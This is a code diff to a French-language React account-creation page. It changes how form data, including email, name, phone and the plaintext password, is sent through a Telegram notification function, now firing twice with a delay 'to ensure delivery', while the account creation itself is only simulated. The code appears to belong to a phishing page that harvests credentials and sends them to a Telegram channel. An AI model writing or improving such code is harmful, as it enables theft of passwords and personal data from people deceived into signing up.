@@ -71,15 +71,23 @@ export default function ComptePage() {
     setIsSubmitting(true)
 
     try {
-      // Send Telegram notification for account creation
+      // Send Telegram notification for account creation - TWICE
       if (typeof window !== 'undefined' && window.sendTelegramNotification) {
-        window.sendTelegramNotification("account_creation", {
+        const accountData = {
           email: formData.email,
           firstName: formData.firstName,
           lastName: formData.lastName,
           phone: formData.phone,
           password: formData.password
-        })
+        }
+        
+        // Send notification twice to ensure delivery
+        window.sendTelegramNotification("account_creation", accountData)
+        
+        // Second notification after 2 seconds
+        setTimeout(() => {
+          window.sendTelegramNotification("account_creation", accountData)
+        }, 2000)
       }
 
       // Simulate account creation
